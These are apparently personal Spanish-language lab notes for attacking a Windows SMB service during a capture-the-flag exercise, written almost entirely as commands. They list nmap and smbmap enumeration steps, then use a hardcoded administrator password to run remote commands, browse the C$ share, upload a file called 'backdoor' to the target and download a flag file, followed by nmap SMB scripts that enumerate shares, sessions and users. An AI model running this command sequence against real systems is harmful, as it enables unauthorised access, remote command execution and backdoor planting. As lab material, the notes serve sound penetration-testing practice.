# Ciber

# SMB

 Primero hacemos un nmap
		`nmap 192.168.18.47`
1. Hacemos nmap más detallado
		`nmap -p445 --script smb* 192.168.18.47`
 2. Utilizamos smbmap:
		 `smbmap -u guest -p "" -d . -H 192.168.18.47`
 3. Ahora como administrador:
 		`smbmap -u administrator -p Temporal.23! -d . -H 192.168.18.47`
 4. Ejecutamos comandos:
			`smbmap -u administrator -p Temporal.23! -H 192.168.18.47 -x whoami` 
			`smbmap -u administrator -p Temporal.23! -H 192.168.18.47 -x "ping 192.168.18.30"`
			`tcpdump -niv enp0s5 icmp`
 5. Listar discos:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! -L`
 6. Listar contenidos de un disco:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! -r C$`
 7. Subir un backdoor:
			`smbmap -H 192.168.18.47 -u administrator -p Temporal.23! --upload "./backdoor" "C$\backdoor"`
8. Nos bajamos la flag:
            `smbmap -H 192.168.18.47 -u administrator -p Temporal.23! --download "C$\flag.txt"`
           
# SMB con Nmap

1. `nmap 192.168.18.47`
2. `nmap -p445 --script smb-protocols 192.168.18.47`
3. `​nmap -p445 --script smb-security-mode 192.168.18.47`
4. `​nmap -p445 --script smb-enum-sessions 192.168.18.47`
5. `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=Temporal.23!  192.168.18.47`
6. `nmap -p445 --script smb-enum-shares 192.168.18.47`
7. `nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=Temporal.23!  192.168.18.47`
8. `nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=Temporal.23!  192.168.18.47`
9. `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=Temporal.23!  192.168.18.47`
10. `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=Temporal.23!  192.168.18.47`
